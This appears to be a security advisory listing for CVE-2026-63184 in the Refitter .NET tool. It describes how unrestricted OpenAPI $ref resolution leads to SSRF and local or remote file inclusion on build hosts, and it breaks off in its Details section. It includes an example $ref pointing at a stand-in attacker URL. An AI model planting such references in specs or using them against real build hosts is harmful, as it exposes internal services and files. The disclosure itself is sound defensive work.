# Refitter\: Unrestricted OpenAPI references permit build\-host SSRF and file inclusion

- **ID**: CVE\-2026\-63184 / GHSA\-x6w4\-f264\-3vvr
- **危険度**: High（重要） (CVSS 7.1)
- **言語**: C\#/\.NET
- **パッケージ**: NuGet/Refitter &lt; 2\.1\.1 → 2\.1\.1
- **公開**: 2026-11-20

## 原文

\#\#\# Summary Refitter \(the \`refitter\` dotnet tool, built on NJsonSchema for \`\$ref\` resolution\) fetches remote \`http\(s\)\` URLs and reads local files \(including absolute paths and \`\.\./\` traversal outside the input directory\), inlining the referenced schema into the generated Refit interface/contracts\. Running \`refitter &lt;spec&gt; \-\-output Out\.cs\` on a spec whose \`\$ref\` points at an attacker/internal URL or an arbitrary local file yields SSRF, remote file inclusion, and local file inclusion\. Verified on Refitter 2\.0\.0\. \#\#\# Details \- \`\$ref\: http\://attacker\-or\-internal/evil\.json\#/\.\.\.\` \-&gt; build host fetch
